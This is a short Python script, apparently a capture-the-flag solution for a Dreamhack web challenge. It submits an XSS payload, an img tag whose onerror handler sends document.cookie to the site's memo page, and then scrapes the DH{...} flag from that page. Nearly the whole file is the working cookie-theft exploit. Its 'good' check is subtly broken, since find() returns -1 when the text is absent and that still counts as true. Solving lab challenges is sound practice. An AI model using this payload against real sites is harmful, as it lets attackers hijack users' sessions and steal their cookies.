import requests
import re

URL = "http://host3.dreamhack.games:13781"

payload = '''<img src=1 onerror='location.href="memo?memo="+document.cookie' />'''

resp = requests.post(URL+'/flag', data={'param': payload})

if resp.text.find('good'):
    resp = requests.get(URL+'/memo')
    match = re.search(r'DH\{[^]^>]*\}', resp.text)
    print(match.group(0))
